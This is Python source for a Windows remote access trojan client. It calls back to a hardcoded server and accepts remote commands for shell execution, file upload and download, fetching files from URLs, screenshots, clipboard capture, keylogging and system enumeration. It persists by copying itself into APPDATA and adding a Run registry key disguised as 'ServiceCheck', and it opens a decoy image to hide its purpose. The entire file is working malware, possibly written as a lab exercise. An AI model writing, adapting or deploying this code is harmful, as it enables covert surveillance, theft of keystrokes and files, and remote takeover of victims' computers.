#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests
import ctypes
from mss import mss
import threading
import pynput.keyboard

#
import pyperclip
import psutil
import struct
import platform
#

ServerIP = "192.168.56.106"
ServerPort = 54321
File_Location = os.environ["appdata"] + "\\srv.exe"
ImageFile="./cat.jpg"
kl_file=os.environ["appdata"] + "\\srv.txt"
keys = ""

#
HEADER_FORMAT = ">I"
#
#
clipboard_history = []
clipboard_lock = threading.Lock()

def monitor_clipboard():
	global clipboard_data, last_clipboard_check
	while True:
		try:
			current_clip = pyperclip.paste()
			if current_clip:
				with clipboard_lock:

					if not clipboard_history or clipboard_history[-1] != current_clip:
						clipboard_history.append(current_clip)            
			time.sleep(1) 
		except Exception:
			pass

def get_clipboard():
	with clipboard_lock: 
		return "\n".join(clipboard_history) if clipboard_history else ""
#
#
def get_systeminfo():
	try:
		system_info = {
			"OS": os.name,
			"Platform": sys.platform,
			"Python_Version": sys.version,
			"Computer_Name": os.environ.get("COMPUTERNAME", "Unknown"),
			"User": os.environ.get("USERNAME", "Unknown"),
			"Architecture": platform.architecture()[0],
			"IP_Addresses": get_ip_addresses(),
			"MAC_Address": get_mac_address(),
			"Processes_Count": len(psutil.pids()),
			"CPU_Usage": psutil.cpu_percent(interval=1),
			"RAM_Usage": psutil.virtual_memory().percent
		}

		installed_software = []
		try:
			import winreg as reg
			key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")

			for i in range(100):  
				try:
					sub_key = reg.EnumKey(key, i)
					value = reg.OpenKey(key, sub_key)
					name, _ = reg.QueryValueEx(value, "DisplayName")
					installed_software.append(name)
					reg.CloseKey(value)

				except FileNotFoundError:
					break

				except Exception:
					continue

			reg.CloseKey(key)

		except Exception:
			pass

		system_info["Installed_Software"] = installed_software[:50]

		lines = []
		for k , v in system_info.items():
			if isinstance(v, list):
				v = ", ".join(v)
			lines.append(f"{k}: {v}")
		return "\n".join(lines)

	except Exception as e:
		return f"Error: {e}"


def get_ip_addresses():
	ips = []

	for iface_name, iface_addrs in psutil.net_if_addrs().items():
		for addr in iface_addrs:
			if addr.family == socket.AF_INET:
				ips.append(addr.address)

	return list(set(ips))

def get_mac_address():
	mac = None
	try:
		import uuid
		mac = uuid.getnode()
		return ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
	except:
		return "Unknown"


#

def process_keys(key):
	global keys
	try:
		keys += str(key.char)
	except AttributeError:
		if key == key.space:
			keys += " "
		elif key == key.enter:
			keys += "\n"
		elif key == key.up:
			exit
		elif key == key.down:
			exit
		elif key == key.left:
			exit
		elif key == key.right:
			exit
		else:
			keys = keys + " [" + str(key) + "] "

def writekeys():
	global keys
	with open(kl_file, "a") as klfile:
		klfile.write(keys)
		keys = ""
		klfile.close()
		timer = threading.Timer(5, writekeys)
		timer.start()


def kl_start():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		writekeys()
		keyboard_listener.join()

#
def reliable_send(data):
	if isinstance(data, (dict, list)):
		json_str = json.dumps(data)
	else:
		if not isinstance(data, str):
			data = str(data)
		json_str = data

	json_bytes = json_str.encode("utf-8")
	length = len(json_bytes)
	header = struct.pack(HEADER_FORMAT, length)

	try:
		s.sendall(header + json_bytes)
	except socket.error:
		pass

def reliable_recv():
	try:
		header_bytes = b""
		while len(header_bytes) < 4:
			chunk = s.recv(4 - len(header_bytes))
			if not chunk:
				return None
			header_bytes += chunk

		length = struct.unpack(HEADER_FORMAT, header_bytes)[0]

		json_bytes = b""
		while len(json_bytes) < length:
			chunk = s.recv(length - len(json_bytes))
			if not chunk:
				return None
			json_bytes += chunk
		try:
			data = json.loads(json_bytes.decode("utf-8"))
			if isinstance(data, str):
				return data
			else:
				return data
		except (ValueError, json.JSONDecodeError):
			return json_bytes.decode("utf-8")

	except Exception:
		return None

def connection():
	global s
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5.0)
			s.connect((ServerIP, ServerPort))
			s.settimeout(None)
			
			communication()
		except socket.timeout:
			print("[!] Connection timed out. Retrying...")
			time.sleep(2)
		except Exception as e:
			print(f"[!] Connection error: {e}. Retrying...")
			time.sleep(2)
		finally:
			try:
				s.close()
			except:
				pass

def communication():
	global keys

	clip_thread = threading.Thread(target = monitor_clipboard, daemon = True)
	clip_thread.start()
	# Communicate
	while True:
		command = reliable_recv()
		if command is None:
			break

		if not isinstance(command, str):
			command = str(command)

		if command == "q":
			try:
				os.remove(kl_file)
			except:
				continue
			break
		elif command[:4] == "help":
			help_data = """
				cd [path]		Change Directory
				download [filename]	Download file from client to server
				upload [filename]	Upload file from server to client
				get [url]		Get file from URL
				start [program]		Start a program
				screenshot		Take screenshot
				check			Check administrator proviledges
				keylog_start		Start keylogger
				keylog_dump		Show keylog data
				[command]		CMD command
				systeminfo		Get system information
				clipboard		Get clipboard content
				q			quit
				"""
			reliable_send(help_data)
		elif command[:10]== "systeminfo":	
			try:
				info = get_systeminfo()
				reliable_send(info)
			except Exception as e:
				reliable_send("[!!] Error getting systeminfo !!!")
		elif command[:9] == "clipboard":
			try:
				clip_content = get_clipboard()
				if not clip_content:
					clip_content = "[!!} Clipboard is empty"
				reliable_send(clip_content)
			except Exception as e:
				reliable_send("[!!] Error getting clipboard !!!")

		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			try:
				with open(command[9:], "rb") as file_down:
					content = file_down.read()
					reliable_send(base64.b64encode(content).decode("ascii"))
			except:
				failed = "[!!] Fail to download!"
				reliable_send(failed)
		elif command[:6] == "upload":
			result = reliable_recv()
			if result[:4] != "[!!]":
				with open(command[7:], "wb") as file_up:
					file_up.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				url = command[4:]
				get_response = requests.get(url)
				file_name = url.split("/")[-1]
				with open(file_name, "wb") as out_file:
					out_file.write(get_response.content)
				reliable_send("[+] File Downloaded!")
			except:
				reliable_send("[!!] Download Failed!")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Program Started!")
			except:
				reliable_send("[!!] PRogram Cannot Start!")
		elif command[:10] == "screenshot":
			try:
				with mss() as screenshot:
					screenshot.shot()
				with open("monitor-1.png","rb") as ss:
					reliable_send(base64.b64encode(ss.read()).decode("ascii"))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed to Take Screenshot!")
		elif command[:5] == "check":
			try:
				os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
				reliable_send("[+] Great, You have Administrator Priviledges!")
			except:
				reliable_send("[!!] Sorry, You are not Administrator!")
		elif command[:12] == "keylog_start":
			kl_thread = threading.Thread(target=kl_start)
			kl_thread.start()
		elif command[:] == "keylog_dump":
			kl_data = open(kl_file, "r")
			reliable_send(kl_data.read())
		else:
			proc = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			response = proc.stdout.read() + proc.stderr.read()
			reliable_send(response.decode('cp950'))

#Slef duplicate
if not os.path.exists(File_Location):
	shutil.copyfile(sys.executable, File_Location)
	#Registry
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d "'+ File_Location + '"', shell=True)

#Open a Image
img = sys._MEIPASS + ImageFile
try:
	subprocess.Popen(img, shell=True)
except:
	A = 1
	B = 2
	SUB = A + B
# Establish Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect
#s.connect((ServerIP, ServerPort))
connection()
#print("Connection Established!")

# Disconnect
s.close()